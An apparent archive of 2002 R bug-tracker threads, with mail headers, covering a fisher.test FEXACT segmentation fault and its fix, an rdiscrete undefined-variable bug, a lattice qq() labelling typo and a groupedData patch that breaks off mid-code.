	Thu, 13 Jun 2002 08:56:18 +0200 (MET DST)
Message-ID: <3D084237.3F455ED2@statistik.uni-dortmund.de>
Date: Thu, 13 Jun 2002 08:56:55 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.79 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: maechler@stat.math.ethz.ch
CC: R-bugs@biostat.ku.dk
Subject: Re: fisher.test FEXACT memory bug "should not occur" (PR#1662)
References: <200206130622.IAA16038@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

maechler@stat.math.ethz.ch wrote:
> 
> This is a bad bug as reported by Robin Hankin,
> it is still in "R-patched" ...
> 
> ##- From: Robin Hankin <r.hankin@auckland.ac.nz>
> ##- To: r-help@stat.math.ethz.ch
> ##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
> ##- Date: Thu, 13 Jun 2002 16:46:26 +1200
> 
> ## .....
> 
> ## Example slighlty modified (MM)
> 
> d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
>                1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
>                0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
>                0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
>                0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
>                1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
>                2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
>                0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
>                0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
>                0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
>              nr=50)
> 
> fisher.test(d4)
> ##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
> ##- Stack length exceeded in f3xact.
> ##- This problem should not occur.

Just for the record:
  repeat try(fisher.test(d4))
results in a crash after a few iterations (R-1.5.0 patched on WinNT
4.0).

Uwe Ligges

==> 1662.reply.1 <==
From maechler@stat.math.ethz.ch  Thu Jun 13 12:17:02 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA19850
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 12:17:01 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id MAA05039;
	Thu, 13 Jun 2002 12:15:37 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa001Eg; Thu Jun 13 12:15:28 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g5DAFsK19920;
	Thu, 13 Jun 2002 12:15:54 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15624.28889.858685.234909@gargle.gargle.HOWL>
Date: Thu, 13 Jun 2002 12:15:53 +0200
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Cc: R-bugs@stat.math.ethz.ch, R-core@stat.math.ethz.ch
Subject: Re: bad fisher.test() bug (PR#1662)
In-Reply-To: <Pine.GSO.4.44.0206131000030.1025-100000@auk.stats>
References: <15624.23861.930057.723845@gargle.gargle.HOWL>
	<Pine.GSO.4.44.0206131000030.1025-100000@auk.stats>
X-Mailer: VM 7.07 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

(CC'ed to R-bugs  ``for the record'')

>>>>> "BDR" == Prof Brian D Ripley <ripley@stats.ox.ac.uk> writes:

    BDR> On Thu, 13 Jun 2002, Martin Maechler wrote:
    >> >>>>> "MM" == Martin Maechler
    >> <maechler@stat.math.ethz.ch> writes:
    >> 
    >> >>>>> "BDR" == Brian D Ripley <ripley@stats.ox.ac.uk>
    >> writes:
    BDR> Martin, What makes this a `bad bug'?  Are you getting a
    BDR> seg fault?
    >>
    MM> yes, always in the half a dozen restarts I tried.
    >>  (in the mean time I had one case where it did not ..)
    >> 
    BDR> Like Uwe this works for me the first few times and I do
    BDR> then get a backtrace (in memory.c, so this is almost
    BDR> certainly an earlier overrun).
    >>
    MM> I see.  This has been different for me.
    >>
    BDR> I think we've had problems before with FEXACT
    BDR> incorrectly specifying the required sizes of its
    BDR> workspaces.
    >>  (I'm not so sure this is the problem here.)
    >> 
    >> I found that
    >> 
    >> fisher.test(d4[1:30,])
    >> 
    >> gives a direct segmentation fault (without any error
    >> message) for me.
    >> 

    BDR> I've had to compile up gdb 5.2 to get the correct
    BDR> information out of R on Linux compiled under gcc-3.1.
    BDR> That shows (on the original problem)

    BDR> Loaded symbols for
    BDR> /users/ripley/R/R-patched/library/ctest/libs/ctest.so
    BDR> #0 f3xact (nrow=0x40051074, irow=0x4005113c,
    BDR> ncol=0x40051000, icol=0x40051120, dlp=0x4041b110,
    BDR> mm=0x40050fc0, fact=0x4035f020, ico=0x4035f4dc,
    BDR> iro=0x4035f5a4, it=0x4035f66c, lb=0x4035f734,
    BDR> nr=0x4035f7fc, nt=0x4035f8c4, nu=0x4035f98c,
    BDR> itc=0x4035fa54, ist=0x40360094, stv=0x40364f18,
    BDR> alen=0x40365ba0, tol=0x4004f878) at
    BDR> /users/ripley/R/cvs/R-patched/src/library/ctest/src/fexact.c:1125
    BDR> 1125 ist[itp] = -1; (gdb) print itp $1 = -3544

    BDR> The same with your variant (except the value of itp).

Okay, I found a much smaller table  --- and a different place
for the seg.fault :
> fisher.test(cbind(0,c(0,0,1)))

Program received signal SIGSEGV, Segmentation fault.
f2xact (nrow=0x8a12ec0, ncol=0x8a12ee0, table=0x8b7bb38, ldtabl=0x8a12f00, 
    expect=0x89dad68, percnt=0x89dad90, emin=0x89dadb8, prt=0x89dade0, 
    pre=0x89dae08, fact=0x403b3020, ico=0x403b302c, iro=0x403b3038, 
    kyy=0x403b3044, idif=0x403b3050, irn=0x403b3058, key=0x403b49d4, 
    ldkey=0xbfffc398, ipoin=0x403b5d44, stp=0x403b70b0, ldstp=0xbfffc39c, 
    ifrq=0x403ffef4, dlp=0x4046d450, dsp=0x4046fb30, tm=0x40472210, 
    key2=0x404748f4, iwk=0x403b3060, rwk=0x403b3d30)
    at ../../../../../R/src/library/ctest/src/fexact.c:524
524		obs += fact[ico[j]] - dd;

Martin



==> 1662.followup.2 <==
From ripley@stats.ox.ac.uk  Thu Jun 13 13:16:27 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA20855
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 13:16:27 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id MAA15227;
	Thu, 13 Jun 2002 12:15:44 +0100 (BST)
Date: Thu, 13 Jun 2002 12:14:46 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: maechler@stat.math.ethz.ch
cc: R-bugs@biostat.ku.dk, <r.hankin@auckland.ac.nz>
Subject: Re: fisher.test FEXACT memory bug "should not occur" (PR#1662)
In-Reply-To: <200206130622.IAA16038@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0206131210510.16576-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

This occurred because integer overflow was giving negative keys.

Append the following line at line 1083 of fexact.c

      if (ipn < 1) ipn += ldst; /* because key might be negative */


> fisher.test(d4)

      Fisher's Exact Test for Count Data

data:  d4
p-value = < 2.2e-16
alternative hypothesis: two.sided



On Thu, 13 Jun 2002 maechler@stat.math.ethz.ch wrote:

> This is a bad bug as reported by Robin Hankin,
> it is still in "R-patched" ...
>
> ##- From: Robin Hankin <r.hankin@auckland.ac.nz>
> ##- To: r-help@stat.math.ethz.ch
> ##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
> ##- Date: Thu, 13 Jun 2002 16:46:26 +1200
>
> ## .....
>
> ## Example slighlty modified (MM)
>
> d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
>                1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
>                0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
>                0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
>                0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
>                1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
>                2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
>                0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
>                0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
>                0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
>              nr=50)
>
> fisher.test(d4)
> ##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
> ##- Stack length exceeded in f3xact.
> ##- This problem should not occur.
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1662.followup.3 <==
From ripley@stats.ox.ac.uk  Thu Jun 13 17:57:14 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA24468
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 17:57:14 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id RAA20365;
	Thu, 13 Jun 2002 17:56:07 +0200 (MET DST)
Received: from toucan.stats.ox.ac.uk(163.1.20.20)
 via SMTP by hypatia, id smtpdAAAa004wF; Thu Jun 13 17:55:59 2002
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id QAA16075;
	Thu, 13 Jun 2002 16:56:21 +0100 (BST)
Date: Thu, 13 Jun 2002 16:56:20 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: Martin Maechler <maechler@stat.math.ethz.ch>
cc: <R-bugs@stat.math.ethz.ch>
Subject: Re: bad fisher.test() bug (PR#1662)
In-Reply-To: <15624.28889.858685.234909@gargle.gargle.HOWL>
Message-ID: <Pine.LNX.4.31.0206131654050.2219-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 13 Jun 2002, Martin Maechler wrote:

> Okay, I found a much smaller table  --- and a different place
> for the seg.fault :
> > fisher.test(cbind(0,c(0,0,1)))


That one is easy:  You (MM) have calculated fact[2], but fact is only of
length 2 (for values 0 and 1), so ico gets overwritten.

I now suspect that my fix for the original bug is merely a fix for a
symptom, so am going to replace it by an error message.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1662.audit <==
Thu Jun 13 19:15:42 2002	ripley	changed notes
Thu Jun 13 19:15:42 2002	ripley	foobar
Thu Jun 13 19:15:42 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1716 *
Subject: rdiscrete in e1071 fails when n==1
From: "John Aitchison" <jaitchis@hwy.com.au>
Date: Fri, 28 Jun 2002 10:28:17 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1716 <==
From postmaster@franz.stat.wisc.edu  Fri Jun 28 07:52:45 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id HAA06061
	for <r-bugs@biostat.ku.dk>; Fri, 28 Jun 2002 07:52:44 +0200 (MET DST)
Received: from mail.hwy.com.au (really [202.22.172.5]) by franz.stat.wisc.edu
	via smail with smtp (ident qmailr using rfc1413)
	id <m17Njd3-000IZ3C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 27 Jun 2002 19:28:49 -0500 (CDT) 
Received: (qmail 17961 invoked from network); 28 Jun 2002 00:26:23 -0000
Received: from tig91-ppp1.mudgee.hwy.com.au (HELO j1) (202.22.172.219)
  by naz.hwy.com.au with SMTP; 28 Jun 2002 00:26:23 -0000
From: "John Aitchison" <jaitchis@hwy.com.au>
To: r-bugs@r-project.org
Date: Fri, 28 Jun 2002 10:28:17 +1000
MIME-Version: 1.0
Content-type: text/plain; charset=US-ASCII
Content-transfer-encoding: 7BIT
Subject: rdiscrete in e1071 fails when n==1
Reply-to: jaitchis@hwy.com.au
Message-ID: <3D1C3A41.3357.E8EBF@localhost>
Priority: normal
X-mailer: Pegasus Mail for Win32 (v3.12c)

# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################





<<insert bug report here>>


in e0171 the routine rdiscrete fails when n==1

the first few lines of code make it obvious why

> rdiscrete
function (n, probs, values = 1:length(probs), method = "inverse", 
    aliasmatrix = NULL) 
{
    if (length(probs) != length(values)) 
        stop("rdiscrete: probs and values must have the same 
length.")
    if (sum(probs < 0) > 0) 
        stop("rdiscrete: probs must not contain negative values.")
    if (n == 1) 
        return(values[sum(runif(1) > p) + 1])   ???? p is undefined at 
this point
    else {




--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = x86
 os = Win32
 system = x86, Win32
 status = 
 major = 1
 minor = 4.1
 year = 2002
 month = 01
 day = 30
 language = R

Windows 98 SE 4.10 (build 2222)  A 

Search Path:
 .GlobalEnv, package:e1071, package:ctest, Autoloads, 
package:base


==> 1716.audit <==
Fri Jun 28 20:36:33 2002	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1729 *
Subject: problem with qq( )
From: Jarno.Tuimala@Helsinki.Fi
Date: Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
--A report on lattice
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1729 <==
From Jarno.Tuimala@Helsinki.Fi  Tue Jul  2 10:37:11 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA28248
	for <R-bugs@biostat.ku.dk>; Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
Date: Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
From: Jarno.Tuimala@Helsinki.Fi
Message-Id: <200207020837.KAA28248@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: problem with qq( )

Full_Name: Jarno Tuimala
Version: 1.5.0
OS: Windows Nt
Submission from: (NULL) (193.166.1.21)


Running the following analysis gives as a result kukot vs. kisut.

aikaero <- -27.5+5*(0:10)
frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
win.graph()
aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
 a.ero <- data.frame(aikaero,
            sukupuoli=rep(c("kukot","kisut"),
                          c(sum(frekvenssi.m),sum(frekvenssi.n))))
    qq(sukupuoli ~ aikaero, data=a.ero)

However, running the following analysis, gives miehet vs. miehet.

 aikaero <- -27.5+5*(0:10)
 frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
 frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
 win.graph()
 aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
 a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("miehet","naiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

This seems to happen everytime "sukupuoli" contains one variable name, which
starts with a letter "n". If both names start with "n" or other letters the
results is miehet vs naiset as expected.

So this works fine:

a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("nisset","naiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

And this also:

a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("miehet","maiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

Where's the problem?
 

==> 1729.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jul  2 11:19:02 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA28796
	for <R-bugs@biostat.ku.dk>; Tue, 2 Jul 2002 11:19:02 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA21799;
	Tue, 2 Jul 2002 10:18:19 +0100 (BST)
Date: Tue, 2 Jul 2002 10:18:18 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <Jarno.Tuimala@Helsinki.Fi>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: problem with qq( ) (PR#1729)
In-Reply-To: <200207020837.KAA28253@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0207021005500.25466-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

1) This is a report on the lattice package, and we both need you to
mention that and to give the version number of lattice that you used
to be sure of beeing able to reproduce this.

2) It seems that the plots are actually correct, just the labels are
wrong. You can correct that by specifying xlab and ylab in the call.

3) The error appears to be a typo:

    if (missing(ylab))
        ylab <- if (is.f.y)
            unique(levels(y))[y]
        else paste("y:", as.character(unique(levels(y)[[2]])))

should be [2] for consistency.

On Tue, 2 Jul 2002 Jarno.Tuimala@Helsinki.Fi wrote:

> Full_Name: Jarno Tuimala
> Version: 1.5.0
> OS: Windows Nt
> Submission from: (NULL) (193.166.1.21)
>
>
> Running the following analysis gives as a result kukot vs. kisut.
>
> aikaero <- -27.5+5*(0:10)
> frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> win.graph()
> aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
>  a.ero <- data.frame(aikaero,
>             sukupuoli=rep(c("kukot","kisut"),
>                           c(sum(frekvenssi.m),sum(frekvenssi.n))))
>     qq(sukupuoli ~ aikaero, data=a.ero)
>
> However, running the following analysis, gives miehet vs. miehet.
>
>  aikaero <- -27.5+5*(0:10)
>  frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
>  frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
>  win.graph()
>  aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
>  a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("miehet","naiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> This seems to happen everytime "sukupuoli" contains one variable name, which
> starts with a letter "n". If both names start with "n" or other letters the
> results is miehet vs naiset as expected.
>
> So this works fine:
>
> a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("nisset","naiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> And this also:
>
> a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("miehet","maiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> Where's the problem?
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1729.followup.2 <==
From deepayansarkar@yahoo.com  Mon Jul  8 19:44:52 2002
Received: from web13902.mail.yahoo.com (web13902.mail.yahoo.com [216.136.175.28])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id TAA03638
	for <R-bugs@biostat.ku.dk>; Mon, 8 Jul 2002 19:44:51 +0200 (MET DST)
Message-ID: <20020708174408.63945.qmail@web13902.mail.yahoo.com>
Received: from [202.54.53.232] by web13902.mail.yahoo.com via HTTP; Mon, 08 Jul 2002 10:44:08 PDT
Date: Mon, 8 Jul 2002 10:44:08 -0700 (PDT)
From: Deepayan Sarkar <deepayansarkar@yahoo.com>
Subject: Re: problem with qq( ) (PR#1729)
To: R-bugs@biostat.ku.dk
In-Reply-To: <Pine.LNX.4.31.0207021005500.25466-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


--- ripley@stats.ox.ac.uk wrote:
> 1) This is a report on the lattice package, and we both need you to
> mention that and to give the version number of lattice that you used
> to be sure of beeing able to reproduce this.
> 
> 2) It seems that the plots are actually correct, just the labels are
> wrong. You can correct that by specifying xlab and ylab in the call.
> 
> 3) The error appears to be a typo:
> 
>     if (missing(ylab))
>         ylab <- if (is.f.y)
>             unique(levels(y))[y]
>         else paste("y:", as.character(unique(levels(y)[[2]])))
> 
> should be [2] for consistency.


Thanks, fixed for future releases.


> On Tue, 2 Jul 2002 Jarno.Tuimala@Helsinki.Fi wrote:
> 
> > Full_Name: Jarno Tuimala
> > Version: 1.5.0
> > OS: Windows Nt
> > Submission from: (NULL) (193.166.1.21)
> >
> >
> > Running the following analysis gives as a result kukot vs. kisut.
> >
> > aikaero <- -27.5+5*(0:10)
> > frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> > frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> > win.graph()
> > aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
> >  a.ero <- data.frame(aikaero,
> >             sukupuoli=rep(c("kukot","kisut"),
> >                           c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >     qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > However, running the following analysis, gives miehet vs. miehet.
> >
> >  aikaero <- -27.5+5*(0:10)
> >  frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> >  frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> >  win.graph()
> >  aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
> >  a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("miehet","naiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > This seems to happen everytime "sukupuoli" contains one variable name,
> which
> > starts with a letter "n". If both names start with "n" or other letters the
> > results is miehet vs naiset as expected.
> >
> > So this works fine:
> >
> > a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("nisset","naiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > And this also:
> >
> > a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("miehet","maiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > Where's the problem?
> >
> >
> >
>
-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read
> http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> >
>
_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
>
-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
>
_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._


__________________________________________________
Do You Yahoo!?
Sign up for SBC Yahoo! Dial - First Month Free
http://sbc.yahoo.com

==> 1729.audit <==
Tue Jul  2 21:14:42 2002	ripley	moved from incoming to Add-ons
Sun Aug 25 11:58:22 2002	ripley	changed notes
Sun Aug 25 11:58:22 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1741 *
Subject: groupedData constructor from a function
From: dieter.menne@menne-biomed.de
Date: Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1741 <==
From dieter.menne@menne-biomed.de  Thu Jul  4 16:00:01 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17348
	for <R-bugs@biostat.ku.dk>; Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
Date: Thu, 4 Jul 2002 15:59:59 +0200 (MET DST)
From: dieter.menne@menne-biomed.de
Message-Id: <200207041359.PAA17348@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: groupedData constructor from a function

Full_Name: Dieter Menne
Version: 1.5.1
OS: win2000
Submission from: (NULL) (212.185.252.139)


Package nlme, version 3.1-27 (but also in earlier)
Calling the groupedData constructor from a function may fail if the formula 
is not passed explicitely. Below a suggested patch 

Suggestions for patches are in the archives, by Thomas Lumley and saikat.
# http://finzi.psych.upenn.edu/R/Rhelp/archive/2250.html
Both are essentially correct, but probably untested (typos).

library(nlme)
data(Oxboys)
# make it a non-grouped data frame
ox<-as.data.frame(Oxboys)

# Changed by DM. See also
# http://finzi.psych.upenn.edu/R/Rhelp/archive/2250.html
# but there were a few typos in there
groupedData<-
function (formula, data = sys.parent(1), order.groups = TRUE, 
    FUN = function(x) max(x, na.rm = TRUE), outer = NULL, inner = NULL, 
    labels = NULL, units = NULL) 
{
    if (!(inherits(formula, "formula") && length(formula) == 
        3)) {
        stop("first argument to groupedData must be a two-sided formula")
    }
    if (is.null(grpForm <- getGroupsFormula(formula, asList = TRUE))) {
        stop("Right hand side of first argument must be a conditional
expression")
    }
    ## patched part follow (may not work with S)
    mCall <- match.call()
    if (length(grpForm) == 1) {
      mCall[[1]] <- as.name("nfGroupedData") 
